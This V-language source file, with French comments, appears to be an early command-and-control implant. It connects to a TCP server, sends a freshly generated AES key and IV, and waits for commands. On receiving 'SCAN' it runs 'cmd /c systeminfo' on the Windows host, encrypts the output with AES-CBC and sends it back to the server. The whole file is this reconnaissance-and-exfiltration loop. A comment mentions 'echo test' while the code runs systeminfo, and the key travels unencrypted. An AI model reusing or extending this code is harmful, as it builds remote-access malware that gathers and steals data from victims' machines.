import net
import os
import crypto.aes
import crypto.cipher
import crypto.rand

fn pad_message(message []u8) []u8 {
    block_size := 16
    padding_size := block_size - (message.len % block_size)
    mut padding := []u8{}
    for i := 0; i < padding_size; i++ {
        padding << u8(padding_size)
    }
    mut padded_message := message.clone()
    for pad in padding {
        padded_message << pad
    }
    return padded_message
}

fn aes_cbc_en(mut src []u8, key []u8, iv []u8) {
    block := aes.new_cipher(key)
    mut mode := cipher.new_cbc(block, iv)
    mode.encrypt_blocks(mut src, src.clone())
}

fn main() {
    key := rand.bytes(32)!
    iv := rand.bytes(16)!

    server_addr := "127.0.0.1:8080"
    mut conn := net.dial_tcp(server_addr) or {
        eprintln('Failed to connect to server: $err')
        return
    }

    // Envoie la clé et l'IV au serveur
    conn.write(key) or {
    eprintln('Failed to send key to server: $err')
    return
}
conn.write(iv) or {
    eprintln('Failed to send iv to server: $err')
    return
}

    for {
        // Lit le message du serveur
        mut buf := []u8{len: 9082}
        num_bytes := conn.read(mut buf) or {
            eprintln('Failed to read from server: $err')
            break
        }

        message := (buf[..num_bytes]).bytestr().trim_space()

        if message == "SCAN" {
            // Exécute la commande "echo test" et récupère son output
            output := os.execute("cmd /c systeminfo")
            //baseoutput := base64.encode(output.output.bytes())

            // Padding and encryption
            mut padded_message := pad_message(output.output.bytes())
            println (padded_message)
            aes_cbc_en(mut padded_message, key, iv)
            //println("Message chiffré envoyé au serveur: $padded_message")

            // Envoie l'output chiffré au serveur
            conn.write(padded_message) or {
                eprintln('Failed to send output to server: $err')
                return
            }
        }
    }

    conn.close() or {}
}
